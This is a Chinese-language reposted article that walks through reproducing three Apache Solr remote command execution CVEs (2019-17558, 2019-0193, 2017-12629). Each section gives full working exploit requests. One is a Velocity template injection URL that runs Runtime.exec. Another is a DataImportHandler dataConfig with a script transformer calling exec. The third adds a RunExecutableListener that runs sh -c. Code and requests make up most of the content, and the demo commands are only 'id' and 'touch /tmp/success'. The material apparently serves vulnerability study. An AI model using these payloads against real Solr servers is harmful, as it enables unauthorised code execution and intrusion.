\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/ada8r5iEDGqXlHmKwfyHdQ)

Apache Solr Velocity 注入远程命令执行漏洞 (CVE-2019-17558)  
漏洞描述

```
Solr是Apache Lucene项目的开源企业搜索平台。其主要功能包括全文检索、命中标示、分面搜索、动态聚类、数据库集成，以及富文本的处理。2019年10月30日，国外安全研究人员放出了一个关于solr 模板注入的exp，攻击者通过未授权访问solr服务器，发送特定的数据包开启 params.resource.loader.enabled，然后get访问接口导致服务器命令执行。


```

影响版本  
5.0.0 到 8.3.1 版本

漏洞复现  
默认情况下 params.resource.loader.enabled 配置未打开，无法使用自定义模板。我们先通过如下 API 获取所有的核心：

```
http://127.0.0.1:8983/solr/admin/cores?indexInfo=false&wt=json


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDD5Gxzia3k2HBYVlxf94O7IFZRbcAVrHmABucAQg4MaDQ6F39aCRFbRO1iaOBib1Cw7LHBxKLXQbT2iaQ/640?wx_fmt=png)

通过如下请求开启 params.resource.loader.enabled，其中 API 路径包含刚才获取的 core 名称：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDD5Gxzia3k2HBYVlxf94O7IFTlaBA3faTYV8XLnVJcrMH1hIDk3p2MPCO3cJT9ne9NgLicYXeCiaR5Xw/640?wx_fmt=png)

```
POST /solr/demo/config HTTP/1.1
Host: solr:8983
Content-Type: application/json
Content-Length: 259

{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}


```

之后，注入 Velocity 模板即可执行任意命令：

```
http://your-ip:8983/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+\[1..$out.available()\])$str.valueOf($chr.toChars($out.read()))%23end


```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDD5Gxzia3k2HBYVlxf94O7IFKNmiaZgNCnfcyDJM462ZOoMEwbiaonp1mVlzUj5BkcHCSkLmRJfPzicCw/640?wx_fmt=png)

Apache Solr 远程命令执行漏洞 (CVE-2019-0193)  
漏洞描述

```
2019年8月1日，Apache Solr官方发布了CVE-2019-0193漏洞预警，漏洞危害评级为严重。当solr开启了DataImportHandler功能，该模块中的DIH配置都可以通过外部请求dataconfig参数进行修改，DIH可包含脚本，因此，会存在远程代码执行漏洞。


```

影响范围  
Apache Solr < 8.2.0

漏洞复现  
搭建完成

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDD5Gxzia3k2HBYVlxf94O7IFicCbLy5Yyo8icz68aJCGh356MP0mKu0WMrNJ8pDUMicAd8jSxKzIRMjNw/640?wx_fmt=png)

通过接口来获取所有 core 信息，因为我们构造 payload 需要 name 信息。  
http://127.0.0.1:8983/solr/admin/cores

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDD5Gxzia3k2HBYVlxf94O7IFeLetK6cnNMRQicvYKxdBbO7pBHwHlETcf0pg2mzmB8ErmiajIYV2QpLA/640?wx_fmt=png)

如上图所示，首先打开刚刚创建好的 test 核心，选择 Dataimport 功能并选择 debug 模式，填入以下 POC：

```
<dataConfig>
  <dataSource type="URLDataSource"/>
  <script><!\[CDATA\[
          function poc(){ java.lang.Runtime.getRuntime().exec("touch /tmp/success");
          }
  \]\]></script>
  <document>
    <entity 
            url="https://stackoverflow.com/feeds/tag/solr"
            processor="XPathEntityProcessor"
            forEach="/feed"
            transformer="script:poc" />
  </document>
</dataConfig>


```

点击 Execute with this Confuguration 会发送以下请求包：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDD5Gxzia3k2HBYVlxf94O7IFbAb0fJO9nNJr7xQIacIuDicm12O1ib6Yp7VqjwYic9AiaoBU4aS5Wt5OicA/640?wx_fmt=png)

```
POST /solr/test/dataimport?\_=1565835261600&indent=on&wt=json HTTP/1.1
Host: localhost:8983
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, \*/\*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 679
Connection: close
Referer: http://localhost:8983/solr/
Cookie: csrftoken=gzcSR6Sj3SWd3v4ZxmV5OcZuPKbOhI6CMpgp5vIMvr5wQAL4stMtxJqL2sUE8INi; sessionid=snzojzqa5zn187oghf06z6xodulpohpr

command=full-import&verbose=false&clean=false&commit=true&debug=true&core=test&dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport


```

可见 / tmp/success 已成功创建：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDD5Gxzia3k2HBYVlxf94O7IFRNehXO0DdRJv4X72XgsicKv8f4AHYKnw5K2wyUScycgSYRgfR8AvLaA/640?wx_fmt=png)

Apache Solr 远程命令执行漏洞（CVE-2017-12629）  
漏洞简介

```
Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为CVE-2017-12629。


```

漏洞复现  
首先创建一个 listener，其中设置 exe 的值为我们想执行的命令，args 的值是命令参数：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDD5Gxzia3k2HBYVlxf94O7IFOaY3kDM3LOd9ynbkFz0VB1dYVBk8tEW8kL1GBDiaMEvzhUVfibufMJdQ/640?wx_fmt=png)

```
POST /solr/demo/config HTTP/1.1
Host: target ip
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 158

{"add-listener":{"event":"postCommit","name":"newlistener","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":\["-c", "touch /tmp/success"\]}}


```

然后进行 update 操作，触发刚才添加的 listener：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDD5Gxzia3k2HBYVlxf94O7IFo2r7sHJw6PwOtqYhiayB5BEm40Aw2ZqTNyuf45g0ejnoILJvHia7KOrg/640?wx_fmt=png)

```
POST /solr/demo/update HTTP/1.1
Host: target ip
Accept: \*/\*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 15

\[{"id":"test"}\]


```

进入容器，可见 / tmp/success 已成功创建：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/nzxUaDY8yDD5Gxzia3k2HBYVlxf94O7IF4Ruj0vibYz1VLo0KyRNibBkos0NU8klY8yEmpCPTQkL8FXV6rYwY8rmQ/640?wx_fmt=png)